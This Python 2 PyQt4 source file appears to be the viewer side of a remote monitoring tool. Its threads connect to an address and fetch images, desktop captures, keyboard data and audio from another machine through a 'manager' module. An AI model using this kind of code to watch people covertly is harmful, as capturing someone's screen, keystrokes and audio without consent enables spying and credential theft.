import sys
from socket import *
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4 import QtCore, QtGui
from manager import *
import pyaudio
import wave
import sys,os

chunk = 1024

class UpdateImage(QThread):
    __address = None
    __manager = None
    
    def __init__(self, address, manager , parent = None):
        super(UpdateImage, self).__init__(parent)
        self.__address = address
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return None
        while True:
            try:
                path = self.__manager.requestImagem(socketServer)
                if path == None:
                    continue
                
                self.emit(SIGNAL('update()'))
            except:
                continue
        socketServer.close()

class UpdateDesktop(QThread):
    __address = None
    __manager = None
    
    def __init__(self, address, manager , parent = None):
        super(UpdateDesktop, self).__init__(parent)
        self.__address = address
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        while True:
            try:
                path = self.__manager.requestDisplay(socketServer)
                if path == None:
                    continue
                self.emit(SIGNAL('update()'))
            except:
                continue
        socketServer.close()
        
class UpdateKeyboard(QThread):
    __address = None
    __size = None
    __manager = None
    
    def __init__(self, address, size, manager , parent = None):
        super(UpdateKeyboard, self).__init__(parent)
        self.__address = address
        self.__size = size
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        while True:
            fileKeys = self.__manager.requestKeyboard(socketServer, self.__size)
            if fileKeys == None:
                continue
            self.emit(SIGNAL('update()'))
            
            
class UpdateAudio(QThread):
    __address = None
    __size = None
    __manager = None
    
    def __init__(self, address, size, manager , parent = None):
        super(UpdateAudio, self).__init__(parent)
        self.__address = address
        self.__size = size
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        #while True:
        audio = self.__manager.requestAudio(socketServer, self.__size)
        if audio == None:
            return
        self.emit(SIGNAL('update()'))